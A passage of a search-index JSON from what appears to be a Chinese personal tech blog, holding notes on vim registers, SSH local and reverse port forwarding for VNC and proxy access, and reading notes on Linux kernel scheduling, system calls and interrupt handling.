\u5b57\u6bcd\u5bc4\u5b58\u5668\uff0c\u4f9b\u7528\u6237\u6307\u5b9a\u4f7f\u7528\uff0c\u6bd4\u5982\"ay\u5c31\u662f\u590d\u5236\u5230\"a\u5bc4\u5b58\u5668\uff0c[b-z]\u7c7b\u63a8\n    \"-      // \u5c11\u4e8e\u4e00\u884c\u7684\"d\",\"c\",\"x\"\u5220\u9664\u5185\u5bb9\n    \".      // \u53ea\u8bfb\u5bc4\u5b58\u5668\n    \":      // \u53ea\u8bfb\u5bc4\u5b58\u5668\n    \"%      // \u53ea\u8bfb\u5bc4\u5b58\u5668\n    \"#      // \u53ea\u8bfb\u5bc4\u5b58\u5668\n\n    \"+      // \u6620\u5c04\u7cfb\u7edf\u526a\u8d34\u677f (\u6709\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e0d\u652f\u6301)\n    \"*      // \u6620\u5c04\u7cfb\u7edf\u526a\u8d34\u677f (\u6709\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e0d\u652f\u6301)\n</code></pre> <p>vim\u9ed8\u8ba4\u590d\u5236\u5230\u7684\u5bc4\u5b58\u5668\u662f<code>\"\"</code>\u5bc4\u5b58\u5668\uff0c\u8981\u60f3\u590d\u5236\u5230\u7cfb\u7edf\u526a\u5207\u677f\uff0c\u53ef\u4ee5\u901a\u8fc7<code>\"+</code>\u5bc4\u5b58\u5668\uff08\u9700\u8981vim\u5f00\u542fclipboard\u529f\u80fd\uff09</p> <p>\u5728\u9009\u4e2d\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u6309<code>y</code>\u9ed8\u8ba4\u5c06\u5185\u5bb9\u590d\u5236\u5230<code>\"\"</code>\u5bc4\u5b58\u5668\u3002\u6309<code>p</code>\u9ed8\u8ba4\u5c06<code>\"\"</code>\u5bc4\u5b58\u5668\u5185\u5bb9\u590d\u5236\u5230\u5f53\u524d\u4f4d\u7f6e\u3002\u8981\u60f3\u590d\u5236\u5230\u6307\u5b9a\u5bc4\u5b58\u5668\uff0c\u8f93\u5165\u5bc4\u5b58\u5668\u540d+y\u5373\u53ef\uff0c\u7c98\u8d34\u65f6\u540c\u7406\u3002</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vim-redo","title":"vim redo","text":"<pre><code>undo: u\nredo: ctrl + r\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#ssh\u7684\u6709\u7528\u529f\u80fd","title":"ssh\u7684\u6709\u7528\u529f\u80fd","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u6b63\u5411\u8f6c\u53d1","title":"\u6b63\u5411\u8f6c\u53d1","text":"<p>\u4f7f\u7528ssh\u53ef\u4ee5\u5728\u4e24\u53f0\u673a\u5668\u95f4\u5efa\u7acb\u4e00\u6761\u52a0\u5bc6\u7684\u96a7\u9053\uff0c\u5e76\u4e14\u8fd8\u53ef\u4ee5\u5c06\u6d41\u91cf\u4ece\u4e00\u53f0\u673a\u5668\u8f6c\u53d1\u5230\u53e6\u4e00\u53f0\u673a\u5668\u3002\u4f7f\u7528\u573a\u666f\u6709\uff1a</p> <ul> <li> <p>A\u80fd\u8bbf\u95eeB\uff0cB\u80fd\u8bbf\u95eeC\uff0c\u4f46\u662fA\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95eeC\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528ssh\u5c06A\u7684\u6d41\u91cf\u8f6c\u53d1\u5230B\uff0c\u7136\u540e\u8bbf\u95eeC</p> </li> <li> <p>vnc\u8fde\u63a5\u65f6\u901a\u8fc7ssh\u5efa\u7acb\u52a0\u5bc6\u96a7\u9053\uff0c\u66f4\u52a0\u5b89\u5168</p> </li> </ul> <pre><code>ssh -L 59000:localhost:5901 -C -N -l server_user_name server_ip_address\n</code></pre> <ul> <li>-L 59000:localhost:5901</li> </ul> <p>The -L argument specifies the post on your local computer (ours is 59000) to the given host (localhost) and port (5901) on the destination server (server_ip_address).</p> <ul> <li> <p>-C: This argument speeds up processes and minimizes resource usage.</p> </li> <li> <p>-N: This argument prevents execution of remote commands and tells SSH to only forward ports.</p> </li> <li> <p>-l server_user_name server_ip_address: This line specifies the user you will use to login to the server. </p> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u8fdc\u7a0b\u673a\u901a\u8fc7\u672c\u5730\u673a\u4ee3\u7406\u4e0a\u7f51\u53cd\u5411\u4ee3\u7406","title":"\u8fdc\u7a0b\u673a\u901a\u8fc7\u672c\u5730\u673a\u4ee3\u7406\u4e0a\u7f51\uff08\u53cd\u5411\u4ee3\u7406\uff09","text":"<p>\u8fdc\u7a0b\u673a\u6bd4\u5982\u670d\u52a1\u5668\u53ef\u80fd\u5904\u4e8e\u5185\u7f51\u73af\u5883\uff0c\u65e0\u6cd5\u8bbf\u95ee\u7f51\u7edc\u3002\u53ef\u4ee5\u901a\u8fc7ssh\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u5177\u4f53\u8fc7\u7a0b\u4e3a\uff1a</p> <ul> <li>\u901a\u8fc7ssh\uff0c\u5728\u672c\u5730\u673a\u548c\u8fdc\u7a0b\u673a\u4e0a\u5efa\u7acb\u4e00\u6761\u96a7\u9053\u3002</li> <li>\u672c\u5730\u673a\u4e0a\u5f00\u542f\u4e00\u4e2a\u4ee3\u7406\u670d\u52a1\uff0c\u6bd4\u5982clash\u3002</li> <li>\u8fdc\u7a0b\u673a\u4e0a\u914d\u7f6e\u7f51\u7edc\u8bbf\u95ee\u4f7f\u7528\u4ee3\u7406\uff08\u5730\u5740\u4f7f\u7528localhost\uff09</li> <li>\u8fdc\u7a0b\u673a\u8bbf\u95ee\u4ee3\u7406\u7684\u7aef\u53e3\u65f6\uff0c\u4f1a\u88abssh\u8f6c\u53d1\u7ed9\u672c\u5730\u673a\uff0c\u4f5c\u4e3a\u672c\u5730\u6d41\u91cf\u3002\u56e0\u6b64\u8be5\u8bbf\u95ee\u4f1a\u53d1\u9001\u7ed9\u672c\u5730\u7684\u4ee3\u7406\u670d\u52a1\uff0c\u5b9e\u73b0\u4e0a\u7f51\u3002</li> </ul> <p>\u6574\u4e2a\u8fc7\u7a0b\u4e2d\u7684\u6838\u5fc3\u662f\uff0c\u670d\u52a1\u5668\u80fd\u8bbf\u95ee\u672c\u5730\u673a\u7684\u4ee3\u7406\u670d\u52a1\u3002\u800c\u8fd9\u662f\u901a\u8fc7ssh\u7684\u53cd\u5411\u8f6c\u53d1\u5b9e\u73b0\u7684\u3002\u5bf9\u5e94\u7684\u9009\u9879\u4e3a\uff1a</p> <pre><code>ssh -fNgR 11223:127.0.0.1:11223 server\n</code></pre> <ul> <li>f\uff1a\u8868\u793a\u540e\u53f0\u6267\u884c</li> <li>N\uff1a\u8868\u793assh\u4e0d\u7528\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4</li> <li>g\uff1a\u8868\u793aAllows remote hosts to connect to local forwarded ports.  If used on a multiplexed connection, then this option must be specified on the master process.</li> <li>\u5176\u4e2d\u5173\u4e8eR\u7684\u89e3\u91ca\uff0c\u4f5c\u7528\u7c7b\u4f3c\u4e8e-L\uff0c\u53ea\u4e0d\u8fc7\u53cd\u4e86\u8fc7\u6765\u3002</li> </ul> <pre><code>-R [bind_address:]port\n             Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be forwarded to the local side.\n\n             This works by allocating a socket to listen to either a TCP port or to a Unix socket on the remote side.  Whenever a connection is made to\n             this port or Unix socket, the connection is forwarded over the secure channel, and a connection is made from the local machine to either an\n             explicit destination specified by host port hostport, or local_socket, or, if no explicit destination was specified, ssh will act as a\n             SOCKS 4/5 proxy and forward connections to the destinations requested by the remote SOCKS client.\n\n             Port forwardings can also be specified in the configuration file.  Privileged ports can be forwarded only when logging in as root on the\n             remote machine.  IPv6 addresses can be specified by enclosing the address in square brackets.\n\n             By default, TCP listening sockets on the server will be bound to the loopback interface only.  This may be overridden by specifying a\n             bind_address.  An empty bind_address, or the address \u2018*\u2019, indicates that the remote socket should listen on all interfaces.  Specifying a\n             remote bind_address will only succeed if the server's GatewayPorts option is enabled (see sshd_config(5)).\n\n             If the port argument is \u20180\u2019, the listen port will be dynamically allocated on the server and reported to the client at run time.  When used\n             together with -O forward the allocated port will be printed to the standard output.\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/","title":"linux\u5185\u6838\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\u9605\u8bfb","text":"<p>linux\u5185\u6838\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff08\u539f\u4e66\u7b2c3\u7248\uff09, Robert Love</p> <ul> <li> <p>\u4e00\u4e2a\u5185\u6838\u7531\uff1a\u8d1f\u8d23\u54cd\u5e94\u4e2d\u65ad\u7684\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff0c\u8d1f\u8d23\u591a\u4e2a\u7a0b\u5e8f\u5206\u4eab\u5904\u7406\u5668\u65f6\u95f4\u7684\u8fdb\u7a0b\u8c03\u5ea6\u7a0b\u5e8f\uff0c\u8d1f\u8d23\u7ba1\u7406\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u7684\u5185\u5b58\u7ba1\u7406\u7a0b\u5e8f\u548c\u7f51\u7edc\u3001\u8fdb\u7a0b\u95f4\u901a\u4fe1\u7b49\u7cfb\u7edf\u670d\u52a1\u7a0b\u5e8f\u7ec4\u6210\u3002</p> </li> <li> <p>\u5e94\u7528\u7a0b\u5e8f\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u8bbf\u95ee\u5185\u6838\uff0c\u5185\u6838\u8fd0\u884c\u4e8e\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u3002\uff08\u4e0d\u540c\u8fdb\u7a0b\u8fd0\u884c\u540c\u6837\u7684\u5185\u6838\u4ee3\u7801\uff0c\u4e0a\u4e0b\u6587\u4e0d\u540c\uff0c\u56e0\u6b64\u6709\u4e0d\u540c\u6548\u679c\uff09</p> </li> <li> <p>\u5bf9\u4e8e\u4e2d\u65ad\u6765\u8bf4\uff0c\u5185\u6838\u8fd0\u884c\u4e8e\u4e2d\u65ad\u4e0a\u4e0b\u6587</p> </li> <li> <p>\u5355\u5185\u6838\u548c\u5fae\u5185\u6838\u3002linux\u6c72\u53d6\u4e86\u5fae\u5185\u6838\u7684\u4f18\u70b9\uff1alinux\u662f\u6a21\u5757\u5316\u7684\uff0c\u591a\u7ebf\u7a0b\u7684\u4ee5\u53ca\u5185\u6838\u672c\u8eab\u53ef\u8c03\u5ea6\u7684\u3002</p> </li> <li> <p>inline\u51fd\u6570\u5fc5\u987b\u7528static\u4fee\u9970\uff0c\u6d89\u53ca\u5230\u7f16\u8bd1\uff0c\u56e0\u4e3ainline\u7684\u542b\u4e49\u6709\u70b9\u50cf\u5b8f\u3002\u800c\u5982\u679c\u4e0d\u7528static\u4fee\u9970\uff0c\u90a3\u4e48\u5176\u4ed6\u6587\u4ef6\u7684\u51fd\u6570\u4e5f\u53ef\u4ee5\u8c03\u7528\u5b83\uff0c\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\u4e0d\u5f97\u4e0d\u5efa\u7acb\u4e00\u4e2a\u7b26\u53f7\u8868\u9879\u3002\u56e0\u6b64\u58f0\u660e\u4e3astatic\u5b9e\u73b0\u8d77\u6765\u66f4\u7b80\u5355\u3002</p> </li> <li> <p>\u5185\u6838\u4f7f\u7528\u7684C\u8bed\u8a00\u7528\u5230\u4e86ISO99\u548cGUN C\u6269\u5c55\u7279\u6027\uff0c\u5176\u4e2d\u51e0\u4e2a\u7528\u7684\u6bd4\u8f83\u5e7f\u7684GUN C\u6269\u5c55\u7279\u6027</p> </li> <li>\u5185\u8054\u51fd\u6570</li> <li>\u5185\u8054\u6c47\u7f16</li> </ul>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u8fdb\u7a0b\u8c03\u5ea6","title":"\u8fdb\u7a0b\u8c03\u5ea6","text":"<ul> <li> <p>\u6bcf\u4e2aCPU\u90fd\u6709\u5355\u72ec\u7684\u8fd0\u884c\u961f\u5217runqueue\uff0c\u6bcf\u4e2arunqueue\u5b9e\u9645\u5305\u542b\u4e24\u4e2aprio_array\u7ed3\u6784\u7684\u6570\u636eactive, expire\u3002active\u8bb0\u5f55\u65f6\u95f4\u7247\u8fd8\u6ca1\u6709\u8fd0\u884c\u5b8c\u7684\u8fdb\u7a0b\uff0cexpire\u5219\u662f\u8fd0\u884c\u5b8c\u7684\u3002prio_array\u5305\u542b\u4e00\u4e2abitmap\u548c\u5b9e\u9645\u7684\u5bf9\u5e94\u4e0d\u540c\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u94fe\u8868struct list_head queue\uff08queue[MAX_PRIO]\uff09\uff0c\u8c03\u5ea6\u65f6schedule():/kernel/sched.c\u66f4\u5177bitmap\u627e\u5230\u975e\u7a7a\u7684\u6700\u9ad8\u4f18\u5148\u7ea7\u7684\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\u4f5c\u4e3a\u5168\u5c40\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u8fdb\u7a0b\u3002</p> </li> <li> <p>\u91cd\u65b0\u5206\u914d\u65f6\u95f4\u7247\uff0ctask_timeslice()\u6839\u636e\u4efb\u52a1\u7684\u9759\u6001\u4f18\u5148\u7ea7\uff08\u7528\u6237\u6307\u5b9a\u7684nice\u503c\uff09\u5206\u914d\u65f6\u95f4\u7247\u3002\u9ed8\u8ba4nice\u4e3a0\u4e3a100ms\u3002</p> </li> <li> <p>\u964d\u4f4e\u4ea4\u4e92\u8fdb\u7a0b\u54cd\u5e94\u65f6\u95f4\uff1a\u6bcf\u4e2a\u5b9a\u65f6\u5668\u4e2d\u65ad\u4f1a\u8c03\u7528scheduler_tick()\uff0c\u8be5\u51fd\u6570\u51cf\u5c11\u4efb\u52a1\u7684\u65f6\u95f4\u7247\uff0c\u5982\u679c\u51cf\u4e3a0\u4e86\uff0c\u5219\u5224\u65ad\u8be5\u8fdb\u7a0b\u662f\u5426\u4e3a\u4ea4\u4e92\u6027\u8fdb\u7a0b\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5219\u6dfb\u52a0\u5230expired\u961f\u5217\u4e2d\uff0c\u5982\u679c\u662f\u4e14\u6ca1\u6709\u53d1\u751fexpired\u961f\u5217\u9965\u997f\u65f6\uff0c\u7ee7\u7eed\u6dfb\u52a0\u5230active\u961f\u5217</p> </li> <li> <p>schedule\u9009\u62e9\u4e86\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u540e\uff0c\u4fbf\u901a\u8fc7contex_switch\u5b8c\u6210\u4e0a\u4e0b\u6587\u4ea4\u6362\u3002\u8be5\u51fd\u6570\u901a\u8fc7\u5219\u8fdb\u4e00\u6b65\u901a\u8fc7\u4ee5\u4e0b\u4e24\u4e2a\u51fd\u6570\u5b9e\u73b0</p> </li> <li> <p>asm/mmu_contex.h:switch_mm\uff1a\u5207\u6362\u865a\u62df\u5185\u5b58</p> </li> <li> <p>asm/system.h:switch_to\uff1a\u5b9e\u73b0\u5904\u7406\u5668\u72b6\u6001\u5207\u6362</p> </li> <li> <p>\u4ec0\u4e48\u65f6\u5019\u8c03\u7528sechdule</p> </li> <li> <p>\u5185\u6838\u901a\u8fc7need_resched\u6807\u5fd7\u6765\u8868\u660e\u662f\u5426\u9700\u8981\u91cd\u65b0\u6267\u884c\u4e00\u6b21\u8c03\u5ea6\u3002</p> <ul> <li>\u5f53\u65f6\u95f4\u7247\u8017\u5c3d\u65f6scheduler_tick\u8bbe\u7f6e</li> <li>\u5f53\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u8fdb\u5165\u53ef\u6267\u884c\u72b6\u6001\u65f6\uff0ctry_to_wake_up\u8bbe\u7f6e</li> </ul> </li> <li> <p>\u7528\u6237\u62a2\u5360</p> <p>\u5f53\u5185\u6838\u5373\u5c06\u8fd4\u56de\u5230\u7528\u6237\u7a7a\u95f4\u65f6\uff0c\u5982\u679cneed_resched\u88ab\u8bbe\u7f6e\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528schedule\uff0c\u4ece\u800c\u53d1\u751f\u7528\u6237\u62a2\u5360</p> </li> <li> <p>\u5185\u6838\u62a2\u5360</p> <p>linux\u5b9e\u73b0\u4e86\u5185\u6838\u62a2\u5360\u3002\u5728\u4e0d\u652f\u6301\u5185\u6838\u62a2\u5360\u7684\u7cfb\u7edf\u4e2d\uff0c\u5185\u6838\u4ee3\u7801\u53ef\u4ee5\u4e00\u76f4\u6267\u884c\u3002</p> </li> <li> <p>\u5b9e\u65f6</p> <p>linux\u652f\u6301SCHED_FIFO\u548cSCHED_RR\u4e24\u79cd\u8bd5\u8bd5\u8c03\u5ea6\u7b56\u7565\u3002FIFO\u4e0d\u9002\u7528\u65f6\u95f4\u7247\uff0c\u4f1a\u6bd4\u4efb\u4f55SCHED_NORMAL\u7684\u8fdb\u7a0b\u90fd\u5148\u5f97\u5230\u8c03\u5ea6\u3002\u4e00\u65e6\u4e00\u4e2aSCHED_FIFO\u5904\u4e8e\u6267\u884c\u72b6\u6001\u5c31\u4f1a\u4e00\u76f4\u6267\u884c\uff0c\u76f4\u5230\u663e\u793a\u91ca\u653e\u5904\u7406\u5668\u4e3a\u6b62\u3002</p> </li> </ul>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u7cfb\u7edf\u8c03\u7528","title":"\u7cfb\u7edf\u8c03\u7528","text":"<ul> <li>\u7cfb\u7edf\u8c03\u7528\u5e94\u8be5\u63d0\u4f9b\u673a\u5236(mechanism)\uff08\u9700\u8981\u63d0\u4f9b\u4ec0\u4e48\u529f\u80fd\uff09\u800c\u4e0d\u662f\u7b56\u7565(policy)\uff08\u600e\u4e48\u4f7f\u7528\u8fd9\u4e9b\u529f\u80fd\uff09\uff08\u9a71\u52a8\u8bbe\u8ba1\u4e5f\u5e94\u8be5\u8fd9\u6837\uff09</li> <li>\u7cfb\u7edf\u8c03\u7528\u5185\u6838\u5b9e\u73b0\uff0c\u9700\u8981\u5728\u51fd\u6570\u524d\u6dfb\u52a0asmlinkage\u9650\u5b9a\u8bcd\uff0c\u544a\u8bc9\u7f16\u8bd1\u5668\u4ec5\u4ece\u6808\u4e2d\u63d0\u53d6\u8be5\u51fd\u6570\u7684\u53c2\u6570\u3002</li> <li>\u5728\u5185\u9677\u5230\u5185\u6838\u7a7a\u95f4\u4e4b\u524d\uff0c\u9700\u8981\u5c06\u7cfb\u7edf\u8c03\u7528\u53f7\u548c\u53c2\u6570\u90fd\u653e\u5230\u5bc4\u5b58\u5668\u91cc\uff08\u591a\u4e8e5\u4e2a\u5219\u4f20\u9012\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u6307\u9488\uff09\uff0c\u7136\u540e\u89e6\u53d1\u8f6f\u4e2d\u65ad(int $0x80)\uff0c\u6267\u884c128\u53f7\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8fsystem_call\uff0c\u5728entry.S\u4e2d\u7528\u6c47\u7f16\u5b9e\u73b0\u3002system_call\u518d\u5c06\u53c2\u6570\uff08\u4ece\u5bc4\u5b58\u5668\u4e2d\u83b7\u5f97\uff09\u4f20\u9012\u7ed9\u771f\u6b63\u7684\u7cfb\u7edf\u8c03\u7528\u51fd\u6570sys_xxx\u3002</li> <li>\u5728\u770b\u8fc7\u7684mips ucore\u4e2d\u5b9e\u73b0\u4e2d\uff0csystem_call\u4e0d\u662f\u7528\u6c47\u7f16\u5b9e\u73b0\u7684\uff0c\u5df2\u7ecf\u662fC\u4e86\u3002\u53c2\u6570\u4e4b\u7c7b\u7684\u90fd\u653e\u5728\u4e2d\u65ad\u5e27\uff08\u5185\u6838\u6808\u4e2d\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff09\u91cc\uff08\u5305\u542b\u5404\u79cd\u5bc4\u5b58\u5668\uff09</li> <li>x86-64\u4e2d\u6dfb\u52a0\u4e86sysenter\u7684\u6307\u4ee4</li> <li>copy_to_user\u548ccopy_from_user</li> <li>\u5373\u4f7f\u6dfb\u52a0\u4e86\u81ea\u5df1\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u7531\u4e8elibc\u5e93\u6ca1\u6709\u8fdb\u884cwrap\uff0c\u56e0\u6b64\u7528\u6237\u7a0b\u5e8f\u9700\u8981\u901a\u8fc7\u6c47\u7f16\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u3002linux\u63d0\u4f9b\u4e86\u76f8\u5173\u5b8f\u2014\u2014<code>_syscalln</code>\uff0c\u7b80\u5316\u4e86\u8be5\u6b65\u9aa4</li> </ul>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f","title":"\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f","text":"<ul> <li>\u4e2d\u65ad\u4e0a\u4e0b\u6587\uff1a</li> </ul> <p>\u5f53\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u6216\u8fd0\u884c\u5185\u6838\u7ebf\u7a0b\u65f6\uff0c\u5185\u6838\u5904\u4e8e\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u3002\u800c\u5f53\u5185\u6838\u6267\u884c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u65f6\uff0c\u5185\u6838\u5904\u4e8e\u4e2d\u65ad\u4e0a\u4e0b\u6587\u3002</p> <p>\u4e2d\u65ad\u6808\uff1a\u66fe\u4eca\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5171\u4eab\u88ab\u4e2d\u65ad\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u30022.6\u7248\u672c\u540e\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u6709\u4e86\u81ea\u5df1\u7684\u6808\uff0c\u5927\u5c0f\u4e3a1\u4e2a\u9875\uff0c\u53734KB\u3002</p> <ul> <li> <p>\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u4e0d\u518d\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\uff0c\u56e0\u6b64\u4e0d\u80fd\u963b\u585e</p> </li> <li> <p>\u8fc7\u7a0b</p> </li> <li> <p>\u6ce8\u518c\u4e2d\u65ad</p> <pre><code>int request_irq(unsigned int irq,\n                irqreturn_t (*handler)(int, void *, struct pt_regs *)),\n                unsigned long irqflags,\n                const char *devname,\n                void *dev_id)\n</code></pre> <ul> <li> <p>irq\u4e3a\u8981\u5206\u914d\u7684\u4e2d\u65ad\u53f7\uff0c\u5bf9\u4e8e\u4f20\u7edfPC\u8bbe\u5907\uff0c\u8be5\u503c\u901a\u5e38\u662f\u9884\u5148\u5b9a\u4e49\u7684</p> </li> <li> <p>handler\u4e3a\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f</p> </li> <li> <p>irqflags</p> </li> <li>SA_INTERRUPT\uff1a\u5feb\u901f\u4e2d\u65ad\uff0c\u5728\u7981\u6b62\u672c\u5730CPU\u4e0a\u7684\u6240\u6709\u4e2d\u65ad\u60c5\u51b5\u4e0b\u8fd0\u884c\u3002</li> <li>SA_SHIRQ\uff1a\u5171\u4eab\u4e2d\u65ad\u7ebf</li> </ul> </li> <li> <p>\u5904\u7406\u5668\u67d0\u7ba1\u811a\u63a5\u6536\u5230\u8bbe\u5907\u4e2d\u65ad\u4fe1\u53f7\uff0c\u5173\u95ed\u4e2d\u65ad\u7cfb\u7edf\uff0c\u8df3\u8f6c\u5230\u4e2d\u65ad\u7a0b\u5e8f\u5165\u53e3\u70b9\u5f00\u59cb\u6267\u884c</p> <p>\u6ce8\uff1ax86\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u4e2d\u65ad\u53f7\u90fd\u4f1a\u8df3\u8f6c\u5230\u4e0d\u540c\u5165\u53e3\u70b9</p> </li> <li> <p>\u5165\u53e3\u70b9\u4ee3\u7801\u5c06\u4e2d\u65ad\u53f7\u538b\u6808\uff0c\u5b58\u653e\u5bc4\u5b58\u5668\uff0c\u7136\u540e\u8c03\u7528do_IRQ()</p> <pre><code>unsigned int do_IRQ(struct pt_regs regs)\n</code></pre> </li> <li> <p>do_IRQ\u5224\u65ad\u4e2d\u65ad\u7ebf\u4e0a\u662f\u5426\u6709\u6ce8\u518c\u7684\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff0c\u5e76\u8c03\u7528handle_IRQ_event\u8fdb\u884c\u5904\u7406\u3002</p> <p>\u6ce81\uff1a\u524d\u9762\u8bf4\u5230\uff0cCPU\u63a5\u6536\u5230\u4e2d\u65ad\u540e\uff0c\u5173\u95ed\u4e86\u4e2d\u65ad\u7cfb\u7edf\u3002\u5728\u8fd9\u91cc\uff0c\u5982\u679cIRQ\u7c7b\u578b\u4e0d\u662fSA_INTERRUPT\uff0c\u5219\u4f1a\u91cd\u65b0\u6253\u5f00\u4e2d\u65ad\u3002</p> <p>\u6ce82\uff1a\u5171\u4eab\u4e2d\u65ad\u7ebf\u7684\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff1a\u4f9d\u6b21\u8c03\u7528\u5728\u8be5\u4e2d\u65ad\u7ebf\u4e0a\u6ce8\u518c\u7684\u6bcf\u4e00\u4e2a\u7a0b\u5e8f\u3002\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u9700\u8981\u5224\u65ad\u662f\u5426\u81ea\u5df1\u6ce8\u518c\u7684\u8bbe\u5907\u4ea7\u751f\u4e86\u4e2d\u65ad\uff08\u901a\u8fc7\u68c0\u67e5\u786c\u4ef6\u72b6\u6001\u5bc4\u5b58\u5668\uff09</p> </li> <li> <p>\u6ca1\u6709\u6216\u8005\u5904\u7406\u5b8c\u540e\uff0c\u5219\u8c03\u7528ret_from_intr()\u8fdb\u884c\u4e2d\u65ad\u8fd4\u56de\u3002</p> </li> </ul>","tags":["kernel"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u4e0b\u534a\u90e8","title":"\u4e0b\u534a\u90e8","text":"<ul> <li> <p>\u4e0a\u534a\u90e8\u548c\u4e0b\u534a\u90e8</p> </li> <li> <p>\u4e00\u4e2a\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u6b63\u5728\u6267\u884c\u65f6\uff0c\u540c\u4e00\u4e2a\u4e2d\u65ad\u7ebf\u5728\u6240\u6709\u5904\u7406\u5668\u4e0a\u90fd\u4f1a\u88ab\u9891\u95ed\u6389\u3002</p> </li> <li> <p>\u56e0\u6b64\u540c\u4e00\u4e2a\u4e2d\u65ad\u7a0b\u5e8f\u4e0d\u4f1a\u88ab\u5d4c\u5957\u8c03\u7528\uff0c\u4ece\u800c\u7b80\u5316\u4e86\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u7684\u7f16\u5199\u3002</p> </li> <li> <p>\u5bf9\u4e8eSA_INTERRUPT\u7c7b\u578b\u4e2d\u65ad\uff0c\u672c\u5730\u5904\u7406\u5668\u7684\u6240\u6709\u4e2d\u65ad\u88ab\u7981\u7528</p> </li> <li> <p>\u7f29\u77ed\u4e2d\u65ad\u88ab\u5c4f\u853d\u65f6\u95f4\u5bf9\u7cfb\u7edf\u54cd\u5e94\u65f6\u95f4\u548c\u6027\u80fd\u5f88\u91cd\u8981</p> </li> <li> 